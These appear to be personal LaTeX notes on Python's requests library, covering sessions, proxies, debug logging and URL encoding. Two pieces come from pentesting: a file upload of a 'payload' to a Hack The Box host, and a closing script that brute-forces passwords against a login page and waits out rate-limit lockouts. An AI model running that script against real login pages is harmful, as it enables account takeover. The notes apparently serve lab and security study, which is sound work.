
\section{Requests}

\url{https://requests.readthedocs.io/en/latest/}

\url{https://fr.python-requests.org/en/latest/user/advanced.html}

\subsection{Config}

\url{https://fr.python-requests.org/en/latest/api.html#configurations}

on a request or a session 
\begin{verbatim}
my_config = {'verbose': sys.stderr}
requests.get('http://httpbin.org/headers', config=my_config)
\end{verbatim}


\subsection{Session}
The Session object allows you to persist certain parameters across requests. It
also persists cookies across all requests made from the Session instance, and
will use urllib3’s connection pooling. So if you’re making several requests to
the same host, the underlying TCP connection will be reused, which can result
in a significant performance increase.

Any dictionaries that you pass to a request method will be merged with the
session-level values that are set. The method-level parameters override session
parameters. 

Tto omit session-level keys from a dict parameter simply set that key’s value
to \verb+None+ in the method-level parameter. It will automatically be omitted.

\begin{verbatim}
headers = {'x-test': 'true'}
auth = ('user', 'pass')

with requests.session(auth=auth, headers=headers) as c:

    # 'x-test' et 'x-test2' sont envoyés
    response = c.get('http://httpbin.org/headers', headers={'x-test2': 'true'})
    response.request.headers
\end{verbatim}

Method-level parameters (such as cookies}  will not be persisted across
requests, even if using a session. If you want to manually add cookies to your
session, use the Cookie utility functions to manipulate \verb+Session.cookies+.

Sessions can also be used as context managers:
\begin{verbatim}
with requests.Session() as s:
    s.get('https://httpbin.org/cookies/set/sessioncookie/123456789')
\end{verbatim}

This will make sure the session is closed as soon as the with block is exited,
even if unhandled exceptions occurred.

\subsection{Proxy}

\subsubsection{Simple proxy}
\begin{verbatim}
proxies = {
   'http': 'http://proxy.example.com:8080',
   'https': 'http://secureproxy.example.com:8090',
}

response = requests.post(url, proxies=proxies)
\end{verbatim}

\subsubsection{Session proxy}
You may also find yourself wanting to scrape from websites that utilize
sessions, in this case, you would have to create a session object. You can do
this by first creating a \verb+session+ variable and setting it to the requests
\verb+Session()+ method. Then similar to before, you would send your session
proxies through the requests method, but this time only passing in the
\verb+url+ as the argument.

\begin{verbatim}
session = requests.Session()

session.proxies = {
   'http': 'http://10.10.10.10:8000',
   'https': 'http://10.10.10.10:8000',
}

response = session.get(url)
\end{verbatim}


\subsection{file upload}
\begin{verbatim}
    url='http://images.late.htb/scanner'
    file ={'file': ('paylaod.png', open('test.png', 'rb'),'image/png')}
    r = requests.post(url, files=file, proxies=proxies)
    print(r.text)

\end{verbatim}


\subsection{logging}
\subsubsection{Solution 1}
\begin{verbatim}
import requests
import http
import logging

# Set up logging to a file
logging.basicConfig(filename="app.log", level=logging.DEBUG)
logger = logging.getLogger(__name__)
http.client.HTTPConnection.debuglevel = 1

# Monkey patch the print() function and redirect it to a logger.debug() call
def print_to_log(*args):
    logger.debug(" ".join(args))
http.client.print = print_to_log

# Test HTTP GET and POST
url = "http://localhost:5000/test"

logger.info("Sending HTTP GET")
resp = requests.get(url)

logger.info("Sending HTTP POST")
resp = requests.post(url, data='My Test Data')
\end{verbatim}

\subsubsection{solution 2} 
\begin{verbatim}
import logging
import contextlib
try:
    from http.client import HTTPConnection # py3
except ImportError:
    from httplib import HTTPConnection # py2

def debug_requests_on():
    '''Switches on logging of the requests module.'''
    HTTPConnection.debuglevel = 1

    logging.basicConfig()
    logging.getLogger().setLevel(logging.DEBUG)
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.DEBUG)
    requests_log.propagate = True

def debug_requests_off():
    '''Switches off logging of the requests module, might be some side-effects'''
    HTTPConnection.debuglevel = 0

    root_logger = logging.getLogger()
    root_logger.setLevel(logging.WARNING)
    root_logger.handlers = []
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.WARNING)
    requests_log.propagate = False

@contextlib.contextmanager
def debug_requests():
    '''Use with 'with'!'''
    debug_requests_on()
    yield
    debug_requests_off()
\end{verbatim}

call:
\begin{verbatim}
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> debug_requests_on()
>>> requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
DEBUG:requests.packages.urllib3.connectionpool:"GET / HTTP/1.1" 200 12150
send: 'GET / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: keep-alive\r\nAccept-
Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.11.1\r\n\r\n'
reply: 'HTTP/1.1 200 OK\r\n'
header: Server: nginx
...
<Response [200]>

>>> debug_requests_off()
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> with debug_requests():
...     requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
...
<Response [200]>
\end{verbatim}

\subsection{URL Encoding query strings or form parameters}
\url{https://www.urlencoder.io/python/}

\begin{verbatim}
>>> import urllib.parse
>>> query = 'Hellö Wörld@Python'
>>> urllib.parse.quote(query)
'Hell%C3%B6%20W%C3%B6rld%40Python'


urllib.parse.quote('/', safe='')
'%2F'

# encode + - 
>>> import urllib.parse
>>> query = 'Hellö Wörld@Python'
>>> urllib.parse.quote_plus(query)
'Hell%C3%B6+W%C3%B6rld%40Python'


>>> import urllib.parse
>>> params = {'q': 'Python URL encoding', 'as_sitesearch': 'www.urlencoder.io'}
>>> urllib.parse.urlencode(params)
'q=Python+URL+encoding&as_sitesearch=www.urlencoder.io'

# If you want the urlencode() function to use the quote() function for encoding parameters
urllib.parse.urlencode(params, quote_via=urllib.parse.quote)


>>> import urllib.parse
>>> params = {'name': 'Rajeev Singh', 'phone': ['+919999999999', '+628888888888']}
>>> urllib.parse.urlencode(params, doseq=True)
'name=Rajeev+Singh&phone=%2B919999999999&phone=%2B628888888888'
\end{verbatim}


\subsubsection{example}
\begin{verbatim}
import requests
import time
url = "http://{}/login.php".format(ip)
# rate limit blocks for 30 seconds
lock_time = 30
# message that alert us we hit rate limit
lock_message = "Too many login failure"
# read user and password
for username in ["support.cn", "support.gr", "support.it",  "support.us"]:
    with open(userpass_file, "r") as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            password = fline.rstrip()
            data = {
                "userid": username,
                "passwd": password,
                "submit": "submit"
            }
    
            #print(" test {} ".format(password))
            # do the request
            res = requests.post(url, headers=headers, data=data)
            #print(res.text)
    
            # handle generic credential error
            if "Invalid credentials" in res.text:
                print("[-] Invalid credentials: userid:{} passwd:{}".format(user
name, password))
            elif lock_message in res.text:
                print("[-] Hit rate limit, sleeping 30")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
            else:
                print("[+++++++++++] Valid credentials: userid:{} passwd:{}".for
mat(username, password))
                exit()

\end{verbatim}

